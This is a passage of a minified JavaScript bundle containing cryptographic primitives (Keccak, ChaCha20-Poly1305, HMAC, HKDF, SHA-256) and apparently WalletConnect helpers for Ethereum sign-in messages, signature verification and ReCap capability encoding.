Uint32Array([287454020]).buffer)[0]===68;function Hrt(r){return r<<24&4278190080|r<<8&16711680|r>>>8&65280|r>>>24&255}function mK(r){for(let e=0;e<r.length;e++)r[e]=Hrt(r[e])}function Vrt(r){if(typeof r!="string")throw new Error("utf8ToBytes expected string, got "+typeof r);return new Uint8Array(new TextEncoder().encode(r))}function o3(r){return typeof r=="string"&&(r=Vrt(r)),r6(r),r}function Krt(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];r6(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}let fB=class{clone(){return this._cloneInto()}};function Wse(r){const e=i=>r().update(o3(i)).digest(),t=r();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>r(),e}function G3(r=32){if(um&&typeof um.getRandomValues=="function")return um.getRandomValues(new Uint8Array(r));if(um&&typeof um.randomBytes=="function")return um.randomBytes(r);throw new Error("crypto.getRandomValues must be defined")}const Hse=[],Vse=[],Kse=[],Grt=BigInt(0),Wb=BigInt(1),Zrt=BigInt(2),Yrt=BigInt(7),Jrt=BigInt(256),Qrt=BigInt(113);for(let r=0,e=Wb,t=1,i=0;r<24;r++){[t,i]=[i,(2*t+3*i)%5],Hse.push(2*(5*i+t)),Vse.push((r+1)*(r+2)/2%64);let n=Grt;for(let s=0;s<7;s++)e=(e<<Wb^(e>>Yrt)*Qrt)%Jrt,e&Zrt&&(n^=Wb<<(Wb<<BigInt(s))-Wb);Kse.push(n)}const[Xrt,eit]=Urt(Kse,!0),wK=(r,e,t)=>t>32?qrt(r,e,t):jrt(r,e,t),bK=(r,e,t)=>t>32?zrt(r,e,t):Frt(r,e,t);function tit(r,e=24){const t=new Uint32Array(10);for(let i=24-e;i<24;i++){for(let o=0;o<10;o++)t[o]=r[o]^r[o+10]^r[o+20]^r[o+30]^r[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=t[c],u=t[c+1],d=wK(l,u,1)^t[a],h=bK(l,u,1)^t[a+1];for(let f=0;f<50;f+=10)r[o+f]^=d,r[o+f+1]^=h}let n=r[2],s=r[3];for(let o=0;o<24;o++){const a=Vse[o],c=wK(n,s,a),l=bK(n,s,a),u=Hse[o];n=r[u],s=r[u+1],r[u]=c,r[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)t[a]=r[o+a];for(let a=0;a<10;a++)r[o+a]^=~t[(a+2)%10]&t[(a+4)%10]}r[0]^=Xrt[i],r[1]^=eit[i]}t.fill(0)}let rit=class Gse extends fB{constructor(e,t,i,n=!1,s=24){if(super(),this.blockLen=e,this.suffix=t,this.outputLen=i,this.enableXOF=n,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,Ry(i),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=Wrt(this.state)}keccak(){gK||mK(this.state32),tit(this.state32,this.rounds),gK||mK(this.state32),this.posOut=0,this.pos=0}update(e){s3(this);const{blockLen:t,state:i}=this;e=o3(e);const n=e.length;for(let s=0;s<n;){const o=Math.min(t-this.pos,n-s);for(let a=0;a<o;a++)i[this.pos++]^=e[s++];this.pos===t&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:t,pos:i,blockLen:n}=this;e[i]^=t,(t&128)!==0&&i===n-1&&this.keccak(),e[n-1]^=128,this.keccak()}writeInto(e){s3(this,!1),r6(e),this.finish();const t=this.state,{blockLen:i}=this;for(let n=0,s=e.length;n<s;){this.posOut>=i&&this.keccak();const o=Math.min(i-this.posOut,s-n);e.set(t.subarray(this.posOut,this.posOut+o),n),this.posOut+=o,n+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Ry(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(zse(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:t,suffix:i,outputLen:n,rounds:s,enableXOF:o}=this;return e||(e=new Gse(t,i,n,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=i,e.outputLen=n,e.enableXOF=o,e.destroyed=this.destroyed,e}};const iit=(r,e,t)=>Wse(()=>new rit(e,r,t)),nit=iit(1,136,256/8),sit="https://rpc.walletconnect.org/v1";function Zse(r){const e=`Ethereum Signed Message:
${r.length}`,t=new TextEncoder().encode(e+r);return"0x"+Buffer.from(nit(t)).toString("hex")}async function oit(r,e,t,i,n,s){switch(t.t){case"eip191":return await ait(r,e,t.s);case"eip1271":return await cit(r,e,t.s,i,n,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${t.t}`)}}async function ait(r,e,t){return(await xtt({hash:Zse(e),signature:t})).toLowerCase()===r.toLowerCase()}async function cit(r,e,t,i,n,s){const o=hw(i);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${i}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",l="0000000000000000000000000000000000000000000000000000000000000041",u=t.substring(2),d=Zse(e).substring(2),h=a+d+c+l+u,f=await fetch(`${s||sit}/?chainId=${i}&projectId=${n}`,{method:"POST",body:JSON.stringify({id:lit(),jsonrpc:"2.0",method:"eth_call",params:[{to:r,data:h},"latest"]})}),{result:p}=await f.json();return p?p.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function lit(){return Date.now()+Math.floor(Math.random()*1e3)}function uit(r){const e=atob(r),t=new Uint8Array(e.length);for(let o=0;o<e.length;o++)t[o]=e.charCodeAt(o);const i=t[0];if(i===0)throw new Error("No signatures found");const n=1+i*64;if(t.length<n)throw new Error("Transaction data too short for claimed signature count");if(t.length<100)throw new Error("Transaction too short");const s=Buffer.from(r,"base64").slice(1,65);return Np.encode(s)}var dit=Object.defineProperty,hit=Object.defineProperties,fit=Object.getOwnPropertyDescriptors,vK=Object.getOwnPropertySymbols,pit=Object.prototype.hasOwnProperty,git=Object.prototype.propertyIsEnumerable,yK=(r,e,t)=>e in r?dit(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,mit=(r,e)=>{for(var t in e||(e={}))pit.call(e,t)&&yK(r,t,e[t]);if(vK)for(var t of vK(e))git.call(e,t)&&yK(r,t,e[t]);return r},wit=(r,e)=>hit(r,fit(e));const bit="did:pkh:",pB=r=>r?.split(":"),vit=r=>{const e=r&&pB(r);if(e)return r.includes(bit)?e[3]:e[1]},AP=r=>{const e=r&&pB(r);if(e)return e[2]+":"+e[3]},ax=r=>{const e=r&&pB(r);if(e)return e.pop()};async function xK(r){const{cacao:e,projectId:t}=r,{s:i,p:n}=e,s=Yse(n,n.iss),o=ax(n.iss);return await oit(o,s,i,AP(n.iss),t)}const Yse=(r,e)=>{const t=`${r.domain} wants you to sign in with your Ethereum account:`,i=ax(e);if(!r.aud&&!r.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let n=r.statement||void 0;const s=`URI: ${r.aud||r.uri}`,o=`Version: ${r.version}`,a=`Chain ID: ${vit(e)}`,c=`Nonce: ${r.nonce}`,l=`Issued At: ${r.iat}`,u=r.exp?`Expiration Time: ${r.exp}`:void 0,d=r.nbf?`Not Before: ${r.nbf}`:void 0,h=r.requestId?`Request ID: ${r.requestId}`:void 0,f=r.resources?`Resources:${r.resources.map(g=>`
- ${g}`).join("")}`:void 0,p=I9(r.resources);if(p){const g=Oy(p);n=Tit(n,g)}return[t,i,"",n,"",s,o,a,c,l,u,d,h,f].filter(g=>g!=null).join(`
`)};function yit(r){return Buffer.from(JSON.stringify(r)).toString("base64")}function xit(r){return JSON.parse(Buffer.from(r,"base64").toString("utf-8"))}function Pg(r){if(!r)throw new Error("No recap provided, value is undefined");if(!r.att)throw new Error("No `att` property found");const e=Object.keys(r.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(t=>{const i=r.att[t];if(Array.isArray(i))throw new Error(`Resource must be an object: ${t}`);if(typeof i!="object")throw new Error(`Resource must be an object: ${t}`);if(!Object.keys(i).length)throw new Error(`Resource object is empty: ${t}`);Object.keys(i).forEach(n=>{const s=i[n];if(!Array.isArray(s))throw new Error(`Ability limits ${n} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${n} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${n}) must be an array of objects, found: ${o}`)})})})}function Cit(r,e,t,i={}){return t?.sort((n,s)=>n.localeCompare(s)),{att:{[r]:Eit(e,t,i)}}}function Eit(r,e,t={}){e=e?.sort((n,s)=>n.localeCompare(s));const i=e.map(n=>({[`${r}/${n}`]:[t]}));return Object.assign({},...i)}function Jse(r){return Pg(r),`urn:recap:${yit(r).replace(/=/g,"")}`}function Oy(r){const e=xit(r.replace("urn:recap:",""));return Pg(e),e}function _it(r,e,t){const i=Cit(r,e,t);return Jse(i)}function Sit(r){return r&&r.includes("urn:recap:")}function Ait(r,e){const t=Oy(r),i=Oy(e),n=Iit(t,i);return Jse(n)}function Iit(r,e){Pg(r),Pg(e);const t=Object.keys(r.att).concat(Object.keys(e.att)).sort((n,s)=>n.localeCompare(s)),i={att:{}};return t.forEach(n=>{var s,o;Object.keys(((s=r.att)==null?void 0:s[n])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[n])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,l;i.att[n]=wit(mit({},i.att[n]),{[a]:((c=r.att[n])==null?void 0:c[a])||((l=e.att[n])==null?void 0:l[a])})})}),i}function Tit(r="",e){Pg(e);const t="I further authorize the stated URI to perform the following actions on my behalf: ";if(r.includes(t))return r;const i=[];let n=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(d=>({ability:d.split("/")[0],action:d.split("/")[1]}));c.sort((d,h)=>d.action.localeCompare(h.action));const l={};c.forEach(d=>{l[d.ability]||(l[d.ability]=[]),l[d.ability].push(d.action)});const u=Object.keys(l).map(d=>(n++,`(${n}) '${d}': '${l[d].join("', '")}' for '${a}'.`));i.push(u.join(", ").replace(".,","."))});const s=i.join(" "),o=`${t}${s}`;return`${r?r+" ":""}${o}`}function CK(r){var e;const t=Oy(r);Pg(t);const i=(e=t.att)==null?void 0:e.eip155;return i?Object.keys(i).map(n=>n.split("/")[1]):[]}function EK(r){const e=Oy(r);Pg(e);const t=[];return Object.values(e.att).forEach(i=>{Object.values(i).forEach(n=>{var s;(s=n?.[0])!=null&&s.chains&&t.push(n[0].chains)})}),[...new Set(t.flat())]}function I9(r){if(!r)return;const e=r?.[r.length-1];return Sit(e)?e:void 0}function gT(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function Qse(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function ac(r,...e){if(!Qse(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function _K(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function kit(r,e){ac(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}function SK(r){if(typeof r!="boolean")throw new Error(`boolean expected, not ${r}`)}const Yf=r=>new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4)),Nit=r=>new DataView(r.buffer,r.byteOffset,r.byteLength),Pit=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!Pit)throw new Error("Non little-endian hardware is not supported");function $it(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}function IP(r){if(typeof r=="string")r=$it(r);else if(Qse(r))r=TP(r);else throw new Error("Uint8Array expected, got "+typeof r);return r}function Rit(r,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(r,e)}function Oit(r,e){if(r.length!==e.length)return!1;let t=0;for(let i=0;i<r.length;i++)t|=r[i]^e[i];return t===0}const Bit=(r,e)=>{function t(i,...n){if(ac(i),r.nonceLength!==void 0){const l=n[0];if(!l)throw new Error("nonce / iv required");r.varSizeNonce?ac(l):ac(l,r.nonceLength)}const s=r.tagLength;s&&n[1]!==void 0&&ac(n[1]);const o=e(i,...n),a=(l,u)=>{if(u!==void 0){if(l!==2)throw new Error("cipher output not supported");ac(u)}};let c=!1;return{encrypt(l,u){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,ac(l),a(o.encrypt.length,u),o.encrypt(l,u)},decrypt(l,u){if(ac(l),s&&l.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,u),o.decrypt(l,u)}}}return Object.assign(t,r),t};function AK(r,e,t=!0){if(e===void 0)return new Uint8Array(r);if(e.length!==r)throw new Error("invalid output length, expected "+r+", got: "+e.length);if(t&&!Mit(e))throw new Error("invalid output, must be aligned");return e}function IK(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s);r.setUint32(e+4,o,i),r.setUint32(e+0,a,i)}function Mit(r){return r.byteOffset%4===0}function TP(r){return Uint8Array.from(r)}function a3(...r){for(let e=0;e<r.length;e++)r[e].fill(0)}const Xse=r=>Uint8Array.from(r.split("").map(e=>e.charCodeAt(0))),Dit=Xse("expand 16-byte k"),Lit=Xse("expand 32-byte k"),Uit=Yf(Dit),jit=Yf(Lit);function gi(r,e){return r<<e|r>>>32-e}function kP(r){return r.byteOffset%4===0}const N8=64,Fit=16,eoe=2**32-1,TK=new Uint32Array;function qit(r,e,t,i,n,s,o,a){const c=n.length,l=new Uint8Array(N8),u=Yf(l),d=kP(n)&&kP(s),h=d?Yf(n):TK,f=d?Yf(s):TK;for(let p=0;p<c;o++){if(r(e,t,i,u,o,a),o>=eoe)throw new Error("arx: counter overflow");const g=Math.min(N8,c-p);if(d&&g===N8){const w=p/4;if(p%4!==0)throw new Error("arx: invalid block position");for(let m=0,x;m<Fit;m++)x=w+m,f[x]=h[x]^u[m];p+=N8;continue}for(let w=0,m;w<g;w++)m=p+w,s[m]=n[m]^l[w];p+=g}}function zit(r,e){const{allowShortKeys:t,extendNonceFn:i,counterLength:n,counterRight:s,rounds:o}=Rit({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof r!="function")throw new Error("core must be a function");return gT(n),gT(o),SK(s),SK(t),(a,c,l,u,d=0)=>{ac(a),ac(c),ac(l);const h=l.length;if(u===void 0&&(u=new Uint8Array(h)),ac(u),gT(d),d<0||d>=eoe)throw new Error("arx: counter overflow");if(u.length<h)throw new Error(`arx: output (${u.length}) is shorter than data (${h})`);const f=[];let p=a.length,g,w;if(p===32)f.push(g=TP(a)),w=jit;else if(p===16&&t)g=new Uint8Array(32),g.set(a),g.set(a,16),w=Uit,f.push(g);else throw new Error(`arx: invalid 32-byte key, got length=${p}`);kP(c)||f.push(c=TP(c));const m=Yf(g);if(i){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");i(w,m,Yf(c.subarray(0,16)),m),c=c.subarray(16)}const x=16-n;if(x!==c.length)throw new Error(`arx: nonce must be ${x} or 16 bytes`);if(x!==12){const T=new Uint8Array(12);T.set(c,s?0:12-c.length),c=T,f.push(c)}const S=Yf(c);return qit(r,w,m,S,l,u,d,o),a3(...f),u}}const Xs=(r,e)=>r[e++]&255|(r[e++]&255)<<8;class Wit{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=IP(e),ac(e,32);const t=Xs(e,0),i=Xs(e,2),n=Xs(e,4),s=Xs(e,6),o=Xs(e,8),a=Xs(e,10),c=Xs(e,12),l=Xs(e,14);this.r[0]=t&8191,this.r[1]=(t>>>13|i<<3)&8191,this.r[2]=(i>>>10|n<<6)&7939,this.r[3]=(n>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|l<<8)&8191,this.r[9]=l>>>5&127;for(let u=0;u<8;u++)this.pad[u]=Xs(e,16+2*u)}process(e,t,i=!1){const n=i?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],l=o[2],u=o[3],d=o[4],h=o[5],f=o[6],p=o[7],g=o[8],w=o[9],m=Xs(e,t+0),x=Xs(e,t+2),S=Xs(e,t+4),T=Xs(e,t+6),k=Xs(e,t+8),I=Xs(e,t+10),E=Xs(e,t+12),C=Xs(e,t+14);let N=s[0]+(m&8191),L=s[1]+((m>>>13|x<<3)&8191),$=s[2]+((x>>>10|S<<6)&8191),y=s[3]+((S>>>7|T<<9)&8191),A=s[4]+((T>>>4|k<<12)&8191),b=s[5]+(k>>>1&8191),v=s[6]+((k>>>14|I<<2)&8191),_=s[7]+((I>>>11|E<<5)&8191),O=s[8]+((E>>>8|C<<8)&8191),D=s[9]+(C>>>5|n),R=0,P=R+N*a+L*(5*w)+$*(5*g)+y*(5*p)+A*(5*f);R=P>>>13,P&=8191,P+=b*(5*h)+v*(5*d)+_*(5*u)+O*(5*l)+D*(5*c),R+=P>>>13,P&=8191;let B=R+N*c+L*a+$*(5*w)+y*(5*g)+A*(5*p);R=B>>>13,B&=8191,B+=b*(5*f)+v*(5*h)+_*(5*d)+O*(5*u)+D*(5*l),R+=B>>>13,B&=8191;let M=R+N*l+L*c+$*a+y*(5*w)+A*(5*g);R=M>>>13,M&=8191,M+=b*(5*p)+v*(5*f)+_*(5*h)+O*(5*d)+D*(5*u),R+=M>>>13,M&=8191;let W=R+N*u+L*l+$*c+y*a+A*(5*w);R=W>>>13,W&=8191,W+=b*(5*g)+v*(5*p)+_*(5*f)+O*(5*h)+D*(5*d),R+=W>>>13,W&=8191;let K=R+N*d+L*u+$*l+y*c+A*a;R=K>>>13,K&=8191,K+=b*(5*w)+v*(5*g)+_*(5*p)+O*(5*f)+D*(5*h),R+=K>>>13,K&=8191;let q=R+N*h+L*d+$*u+y*l+A*c;R=q>>>13,q&=8191,q+=b*a+v*(5*w)+_*(5*g)+O*(5*p)+D*(5*f),R+=q>>>13,q&=8191;let J=R+N*f+L*h+$*d+y*u+A*l;R=J>>>13,J&=8191,J+=b*c+v*a+_*(5*w)+O*(5*g)+D*(5*p),R+=J>>>13,J&=8191;let le=R+N*p+L*f+$*h+y*d+A*u;R=le>>>13,le&=8191,le+=b*l+v*c+_*a+O*(5*w)+D*(5*g),R+=le>>>13,le&=8191;let ae=R+N*g+L*p+$*f+y*h+A*d;R=ae>>>13,ae&=8191,ae+=b*u+v*l+_*c+O*a+D*(5*w),R+=ae>>>13,ae&=8191;let U=R+N*w+L*g+$*p+y*f+A*h;R=U>>>13,U&=8191,U+=b*d+v*u+_*l+O*c+D*a,R+=U>>>13,U&=8191,R=(R<<2)+R|0,R=R+P|0,P=R&8191,R=R>>>13,B+=R,s[0]=P,s[1]=B,s[2]=M,s[3]=W,s[4]=K,s[5]=q,s[6]=J,s[7]=le,s[8]=ae,s[9]=U}finalize(){const{h:e,pad:t}=this,i=new Uint16Array(10);let n=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=n,n=e[a]>>>13,e[a]&=8191;e[0]+=n*5,n=e[0]>>>13,e[0]&=8191,e[1]+=n,n=e[1]>>>13,e[1]&=8191,e[2]+=n,i[0]=e[0]+5,n=i[0]>>>13,i[0]&=8191;for(let a=1;a<10;a++)i[a]=e[a]+n,n=i[a]>>>13,i[a]&=8191;i[9]-=8192;let s=(n^1)-1;for(let a=0;a<10;a++)i[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|i[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+t[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+t[a]|0)+(o>>>16)|0,e[a]=o&65535;a3(i)}update(e){_K(this);const{buffer:t,blockLen:i}=this;e=IP(e);const n=e.length;for(let s=0;s<n;){const o=Math.min(i-this.pos,n-s);if(o===i){for(;i<=n-s;s+=i)this.process(e,s);continue}t.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===i&&(this.process(t,0,!1),this.pos=0)}return this}destroy(){a3(this.h,this.r,this.buffer,this.pad)}digestInto(e){_K(this),kit(e,this),this.finished=!0;const{buffer:t,h:i}=this;let{pos:n}=this;if(n){for(t[n++]=1;n<16;n++)t[n]=0;this.process(t,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=i[o]>>>0,e[s++]=i[o]>>>8;return e}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}}function Hit(r){const e=(i,n)=>r(n).update(IP(i)).digest(),t=r(new Uint8Array(32));return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=i=>r(i),e}const Vit=Hit(r=>new Wit(r));function Kit(r,e,t,i,n,s=20){let o=r[0],a=r[1],c=r[2],l=r[3],u=e[0],d=e[1],h=e[2],f=e[3],p=e[4],g=e[5],w=e[6],m=e[7],x=n,S=t[0],T=t[1],k=t[2],I=o,E=a,C=c,N=l,L=u,$=d,y=h,A=f,b=p,v=g,_=w,O=m,D=x,R=S,P=T,B=k;for(let W=0;W<s;W+=2)I=I+L|0,D=gi(D^I,16),b=b+D|0,L=gi(L^b,12),I=I+L|0,D=gi(D^I,8),b=b+D|0,L=gi(L^b,7),E=E+$|0,R=gi(R^E,16),v=v+R|0,$=gi($^v,12),E=E+$|0,R=gi(R^E,8),v=v+R|0,$=gi($^v,7),C=C+y|0,P=gi(P^C,16),_=_+P|0,y=gi(y^_,12),C=C+y|0,P=gi(P^C,8),_=_+P|0,y=gi(y^_,7),N=N+A|0,B=gi(B^N,16),O=O+B|0,A=gi(A^O,12),N=N+A|0,B=gi(B^N,8),O=O+B|0,A=gi(A^O,7),I=I+$|0,B=gi(B^I,16),_=_+B|0,$=gi($^_,12),I=I+$|0,B=gi(B^I,8),_=_+B|0,$=gi($^_,7),E=E+y|0,D=gi(D^E,16),O=O+D|0,y=gi(y^O,12),E=E+y|0,D=gi(D^E,8),O=O+D|0,y=gi(y^O,7),C=C+A|0,R=gi(R^C,16),b=b+R|0,A=gi(A^b,12),C=C+A|0,R=gi(R^C,8),b=b+R|0,A=gi(A^b,7),N=N+L|0,P=gi(P^N,16),v=v+P|0,L=gi(L^v,12),N=N+L|0,P=gi(P^N,8),v=v+P|0,L=gi(L^v,7);let M=0;i[M++]=o+I|0,i[M++]=a+E|0,i[M++]=c+C|0,i[M++]=l+N|0,i[M++]=u+L|0,i[M++]=d+$|0,i[M++]=h+y|0,i[M++]=f+A|0,i[M++]=p+b|0,i[M++]=g+v|0,i[M++]=w+_|0,i[M++]=m+O|0,i[M++]=x+D|0,i[M++]=S+R|0,i[M++]=T+P|0,i[M++]=k+B|0}const Git=zit(Kit,{counterRight:!1,counterLength:4,allowShortKeys:!1}),Zit=new Uint8Array(16),kK=(r,e)=>{r.update(e);const t=e.length%16;t&&r.update(Zit.subarray(t))},Yit=new Uint8Array(32);function NK(r,e,t,i,n){const s=r(e,t,Yit),o=Vit.create(s);n&&kK(o,n),kK(o,i);const a=new Uint8Array(16),c=Nit(a);IK(c,0,BigInt(n?n.length:0),!0),IK(c,8,BigInt(i.length),!0),o.update(a);const l=o.digest();return a3(s,a),l}const Jit=r=>(e,t,i)=>({encrypt(n,s){const o=n.length;s=AK(o+16,s,!1),s.set(n);const a=s.subarray(0,-16);r(e,t,a,a,1);const c=NK(r,e,t,a,i);return s.set(c,o),a3(c),s},decrypt(n,s){s=AK(n.length-16,s,!1);const o=n.subarray(0,-16),a=n.subarray(-16),c=NK(r,e,t,o,i);if(!Oit(a,c))throw new Error("invalid tag");return s.set(n.subarray(0,-16)),r(e,t,s,s,1),a3(c),s}}),toe=Bit({blockSize:64,nonceLength:12,tagLength:16},Jit(Git));let roe=class extends fB{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,hB(e);const i=o3(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const n=this.blockLen,s=new Uint8Array(n);s.set(i.length>n?e.create().update(i).digest():i);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return s3(this),this.iHash.update(e),this}digestInto(e){s3(this),r6(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:i,finished:n,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=n,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=i._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const wE=(r,e,t)=>new roe(r,e).update(t).digest();wE.create=(r,e)=>new roe(r,e);function Qit(r,e,t){return hB(r),t===void 0&&(t=new Uint8Array(r.outputLen)),wE(r,o3(t),o3(e))}const mT=new Uint8Array([0]),PK=new Uint8Array;function Xit(r,e,t,i=32){if(hB(r),Ry(i),i>255*r.outputLen)throw new Error("Length should be <= 255*HashLen");const n=Math.ceil(i/r.outputLen);t===void 0&&(t=PK);const s=new Uint8Array(n*r.outputLen),o=wE.create(r,e),a=o._cloneInto(),c=new Uint8Array(o.outputLen);for(let l=0;l<n;l++)mT[0]=l+1,a.update(l===0?PK:c).update(t).update(mT).digestInto(c),s.set(c,r.outputLen*l),o._cloneInto(a);return o.destroy(),a.destroy(),c.fill(0),mT.fill(0),s.slice(0,i)}const ent=(r,e,t,i,n)=>Xit(r,Qit(r,e,t),i,n);function tnt(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s),c=i?4:0,l=i?0:4;r.setUint32(e+c,o,i),r.setUint32(e+l,a,i)}function rnt(r,e,t){return r&e^~r&t}function int(r,e,t){return r&e^r&t^e&t}let nnt=class extends fB{constructor(e,t,i,n){super(),this.blockLen=e,this.outputLen=t,this.padOffset=i,this.isLE=n,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=pT(this.buffer)}update(e){s3(this);const{view:t,buffer:i,blockLen:n}=this;e=o3(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(n-this.pos,s-o);if(a===n){const c=pT(e);for(;n<=s-o;o+=n)this.process(c,o);continue}i.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===n&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){s3(this),zse(e,this),this.finished=!0;const{buffer:t,view:i,blockLen:n,isLE:s}=this;let{pos:o}=this;t[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>n-o&&(this.process(i,0),o=0);for(let d=o;d<n;d++)t[d]=0;tnt(i,n-8,BigInt(this.length*8),s),this.process(i,0);const a=pT(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let d=0;d<l;d++)a.setUint32(4*d,u[d],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:i,length:n,finished:s,destroyed:o,pos:a}=this;return e.length=n,e.pos=a,e.finished=s,e.destroyed=o,n%t&&e.buffer.set(i),e}};const snt=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),gf=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),mf=new Uint32Array(64);class ont extends 